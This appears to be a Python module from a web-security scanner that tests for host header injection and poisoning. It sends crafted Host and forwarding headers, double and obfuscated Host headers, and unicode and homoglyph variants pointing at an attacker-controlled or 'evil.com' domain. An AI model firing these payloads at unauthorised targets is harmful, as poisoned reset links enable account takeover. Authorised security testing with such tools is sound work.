#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
from utils.style import Colors
from utils.utils import (
    requests,
    urlparse,
    get_domain_from_url,
    CANARY,
    human_time,
    check_raw_response,
)
from utils.requests_settings import _raw_request
from utils import live



def _send_double_host(original_host, human, port, use_ssl, path, method, body, headers, interactdom, canary_ua, timeout=10):
    """
    Double Host header + space-prefixed header smuggling via raw socket.
    """
    results = []

    double_host_cases = [
        [("Host", original_host), ("Host", interactdom)],
        [("Host", interactdom), ("Host", original_host)],
        [("Host", original_host), (" Host", interactdom)],
        [("Host", original_host), ("\tHost", interactdom)],
        [("Host", original_host), (" X-Forwarded-Host", interactdom)],
        [("Host", f"{original_host}\r\n {interactdom}")],
        [("Host", f"{original_host}\r\n\t{interactdom}")],
    ]

    for host_combo in double_host_cases:
        try:
            live.testing(f"HHIP double-host {dict(host_combo)}")
            request_line = f"{method} {path} HTTP/1.1\r\n"

            raw_headers = ""
            for hname, hval in host_combo:
                raw_headers += f"{hname}: {hval}\r\n"

            for k, v in headers.items():
                if k.lower() == "host":
                    continue
                if k.lower() == "user-agent":
                    raw_headers += f"{k}: {canary_ua}\r\n"
                else:
                    raw_headers += f"{k}: {v}\r\n"

            body_bytes = body.encode() if isinstance(body, str) else (body or b"")
            if body_bytes:
                raw_headers += f"Content-Length: {len(body_bytes)}\r\n"

            human_time(human)
            raw_req = (request_line + raw_headers + "\r\n").encode() + body_bytes
            raw_resp = _raw_request(original_host, port, raw_req, use_ssl=use_ssl, timeout=timeout)
            payload_desc = {h[0]: h[1] for h in host_combo}
            results.append((payload_desc, raw_resp))

        except Exception as e:
            payload_desc = {h[0]: h[1] for h in host_combo}
            print(f"  {Colors.RED}[!] double-host error ({payload_desc}): {e}{Colors.RESET}")

    return results


def _build_unicode_payloads(original_host, interactdom):
    """
    Build unicode-based Host header payloads.
    Returns list of (header_name, header_value) tuples.
    """
    UNICODE_DOTS = ["\u3002", "\uFF0E", "\u2027", "\u2024"]

    ZWCHARS = ["\u200B", "\u200C", "\u200D", "\uFEFF", "\u00AD", "\u034F", "\u2060"]

    HOMOGLYPHS = [
        ("a", "\u0430"), ("e", "\u0435"), ("o", "\u043E"), ("i", "\u0456"),
        ("c", "\u0441"), ("p", "\u0440"), ("s", "\u0455"), ("t", "\u0442"),
    ]

    UNICODE_HOST_NAMES = [
        "\uFF28\uFF4F\uFF53\uFF54",   # Ｈｏｓｔ
        "H\u03BFst",                    # Hοst
        "\u041Dost",                    # Ноst
        "Ho\u0455t",                    # Hoѕt
        "Hos\u0442",                    # Hosт
    ]

    RTL_CHARS = ["\u202E", "\u202A", "\u200F"]

    payloads = []
    interactdom_parts = interactdom.split(".")

    # Unicode dots in interactdom
    if len(interactdom_parts) >= 2:
        for udot in UNICODE_DOTS:
            payloads.append(("Host", udot.join(interactdom_parts)))

    # Unicode dots between original_host and interactdom
    if len(interactdom_parts) >= 2:
        for udot in UNICODE_DOTS:
            payloads.append(("Host", f"{original_host}{udot}{interactdom}"))

    # Zero-width chars injected in interactdom
    for zw in ZWCHARS:
        payloads.append(("Host", interactdom[0] + zw + interactdom[1:]))
        payloads.append(("Host", interactdom.replace(".", f"{zw}.", 1)))

    # Zero-width chars between original_host and interactdom
    for zw in ZWCHARS:
        payloads.append(("Host", f"{original_host}{zw}.{interactdom}"))

    # Homoglyphs on original_host
    for char_orig, char_repl in HOMOGLYPHS:
        if char_orig in original_host:
            payloads.append(("Host", original_host.replace(char_orig, char_repl, 1)))

    # Homoglyphs on interactdom
    for char_orig, char_repl in HOMOGLYPHS:
        if char_orig in interactdom:
            payloads.append(("Host", interactdom.replace(char_orig, char_repl, 1)))

    # Unicode "Host" header names
    for uhost_name in UNICODE_HOST_NAMES:
        payloads.append((uhost_name, interactdom))

    # RTL/directional prefix
    for rtl in RTL_CHARS:
        payloads.append(("Host", f"{rtl}{interactdom}"))
        payloads.append(("Host", f"{original_host}{rtl}{interactdom}"))

    return payloads


def _send_unicode_payloads(original_host, human, port, use_ssl, path, method, body, headers, interactdom, canary_ua, unicode_payloads, timeout=10):
    """
    Send unicode Host payloads via raw socket.
    """
    results = []

    for header_name, header_value in unicode_payloads:
        try:
            live.testing(f"HHIP unicode {header_name}: {header_value}")
            raw_headers = ""
            for k, v in headers.items():
                if k.lower() == "host":
                    continue
                if k.lower() == "user-agent":
                    raw_headers += f"{k}: {canary_ua}\r\n"
                else:
                    raw_headers += f"{k}: {v}\r\n"

            body_bytes = body.encode("utf-8") if isinstance(body, str) else (body or b"")
            if body_bytes:
                raw_headers += f"Content-Length: {len(body_bytes)}\r\n"

            request_line = f"{method} {path} HTTP/1.1\r\n"
            host_line = f"{header_name}: {header_value}\r\n"
            raw_req = (request_line + host_line + raw_headers + "\r\n").encode("utf-8") + body_bytes
            human_time(human)
            raw_resp = _raw_request(original_host, port, raw_req, use_ssl=use_ssl, timeout=timeout)
            payloads_info = {header_name: header_value}
            results.append((payloads_info, raw_resp))

        except Exception:
            pass

    return results


def hhip(url, human, parsed_req, baseline, interact, proxy=None):
    """
    Host Header Injection Poisoning
    """
    print(f"{Colors.CYAN} ├ HHIP analysis{Colors.RESET}")
    if not interact:
        print(f"  {Colors.YELLOW}[!] No -i/--interact provided — OOB disabled, reflection-only mode{Colors.RESET}")
    interactdom = get_domain_from_url(interact) if interact else "evil.com"
    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])

    scheme = urlparse(url).scheme
    use_ssl = scheme == "https"

    port = 443 if use_ssl else 80
    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    canary_ua = None

    for h in headers:
        if h.lower() == "user-agent":
            canary_ua = f"{headers[h]}-{CANARY}"
            headers[h] = canary_ua
    if not canary_ua:
        canary_ua = f"Mozilla/5.0-{CANARY}"

    # --- Phase 1: Standard header injection payloads (via requests) ---
    print(f"{Colors.CYAN} └─ Standard header injection{Colors.RESET}")
    hhi_payloads = [
        {"Host": interactdom},
        {"Host": interact},
        {"Host": f"{interactdom}\\.{original_host}"},
        {"Host": f"{original_host}.{interactdom}"},
        {"Host": f"{interactdom}%00{original_host}"},
        {"Host": f"{interactdom}%09{original_host}"},
        {"Host": f"{original_host}@{interactdom}"},
        {"Host": f"{original_host}%23{interactdom}"},
        {"Host": f"{original_host}:{interactdom}"},
        {"Host": f"{original_host}#@{interactdom}"},
        {"Host": f"{interactdom}%.{original_host}"},
        {"X-Forwarded-For": interactdom},
        {"X-Forwarded-Host": interactdom},
        {"X-Client-IP": interactdom},
        {"X-Remote-IP": interactdom},
        {"X-Remote-Addr": interactdom},
        {"X-Host": interactdom},
        {"X-Original-URL": interact},
        {"X-Rewrite-URL": interact},
        {"X-Forwarded-Server": interactdom},
        {"X-Original-Host": interactdom},
        {"Forwarded": f"host={interactdom}"},
    ]

    status_anoms = {}  # (baseline_status, new_status) -> [payloads]
    for hhi_p in hhi_payloads:
        # Without -i/--interact the full-URL payloads ({'Host': None},
        # {'X-Original-URL': None}, ...) carry a None value — skip them instead
        # of sending a malformed header.
        if any(v is None for v in hhi_p.values()):
            continue
        header_inj = headers.copy()
        header_inj.update(hhi_p)
        try:
            live.testing(f"HHIP {hhi_p}")
            human_time(human)
            resp_hhi = requests.request(
                method=method, url=uri, headers=header_inj,
                data=body or None, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )
            _check_response(resp_hhi, interactdom, baseline, hhi_p, interact, CANARY, path, status_anoms)
        except requests.RequestException as e:
            print(f"  {Colors.RED}[!] request error: {e}{Colors.RESET}")
    _print_status_anoms(status_anoms)

    # --- Phase 2: Double Host headers (raw socket) ---
    print(f"{Colors.BLUE} └─ Double Host headers{Colors.RESET}")
    dh_results = _send_double_host(
        original_host, human, port, use_ssl, path, method, body,
        headers, interactdom, canary_ua
    )
    for payload_desc, raw_resp in dh_results:
        check_raw_response(raw_resp, interactdom, baseline, payload_desc, interact, CANARY, path)

    # --- Phase 3: Unicode Host injection (raw socket) ---
    print(f"{Colors.BLUE} └─ Unicode Host injection{Colors.RESET}")
    unicode_payloads = _build_unicode_payloads(original_host, interactdom)
    unicode_results = _send_unicode_payloads(
        original_host, human, port, use_ssl, path, method, body,
        headers, interactdom, canary_ua, unicode_payloads
    )
    for payload_info, raw_resp in unicode_results:
        check_raw_response(raw_resp, interactdom, baseline, payload_info, interact, CANARY, path)

    # Ground-truth caveat: host-poisoning almost never shows in the HTTP response —
    # the injected host lands in the reset *email's* link. "No reflection" here is
    # NOT proof of safety; it just means the response didn't leak it.
    print(f"{Colors.CYAN}   └── [i] response-side check only — a poisoned link shows up in the delivered "
          f"email, not here.{Colors.RESET}")
    if interact:
        print(f"{Colors.CYAN}       Confirm out-of-band: watch {interact} for a hit, or read the received email.{Colors.RESET}")
    else:
        print(f"{Colors.CYAN}       Confirm out-of-band: use -i/--interact or --disposable-mail, or read the received email.{Colors.RESET}")


# Status codes that are just the edge/CDN rejecting a wrong Host — never an HHI
# signal. 421 (Misdirected Request) is what an HTTP/2 front-end returns when the
# :authority doesn't match the TLS SNI, so a whole run of them is pure noise.
_HHI_REJECT_STATUSES = {400, 401, 403, 404, 405, 421, 429, 500, 502, 503, 504}


def _print_status_anoms(status_anoms):
    """Print deduped status-transition anomalies (collapse identical ones ×N)."""
    for (base_s, new_s), payloads in status_anoms.items():
        n = len(payloads)
        suffix = f" (×{n})" if n > 1 else ""
        print(f"{Colors.YELLOW}   └──  [{base_s} > {new_s}]{suffix} {Colors.RESET}| PAYLOAD: {payloads[0]}")


def _check_response(resp, interactdom, baseline, payload, interact, canary, path, status_anoms=None):
    """Check a requests.Response for HHI indicators."""
    if interactdom and interactdom in resp.text:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in body | PAYLOAD: {payload}{Colors.RESET}")
    resp_headers_str = str(resp.headers)
    if interactdom and interactdom in resp_headers_str:
        print(f"{Colors.GREEN}   └── [+] {interactdom} reflected in headers | PAYLOAD: {payload}{Colors.RESET}")
    if resp.status_code != baseline['status'] and resp.status_code not in _HHI_REJECT_STATUSES:
        if status_anoms is None:
            print(f"{Colors.YELLOW}   └──  [{baseline['status']} > {resp.status_code}] {Colors.RESET}| PAYLOAD: {payload}")
        else:
            status_anoms.setdefault((baseline['status'], resp.status_code), []).append(payload)
    # Dynamic pages jitter by a few bytes (CSRF nonce, timestamp) — only flag a
    # length change that's clearly structural: >5% of the baseline and >200 bytes.
    if resp.status_code == baseline['status']:
        bl = baseline['body_length']
        delta = abs(len(resp.content) - bl)
        if bl > 0 and delta > 200 and delta / bl > 0.05:
            print(f"{Colors.YELLOW}   └──  [{bl}b > {len(resp.content)}b] {Colors.RESET}| PAYLOAD: {payload}")
    if interact:
        try:
            req_interact = requests.get(interact, verify=False, allow_redirects=False, timeout=10)
            if req_interact.status_code == 200:
                if canary in req_interact.text:
                    print(f"{Colors.GREEN}   └── [+] canary '{canary}' caught on {interact} {Colors.RESET}| PAYLOAD: {payload}")
                if path in req_interact.text:
                    print(f"{Colors.GREEN}   └── [+] path '{path}' caught on {interact} {Colors.RESET}| PAYLOAD:  {payload}")
        except requests.RequestException:
            pass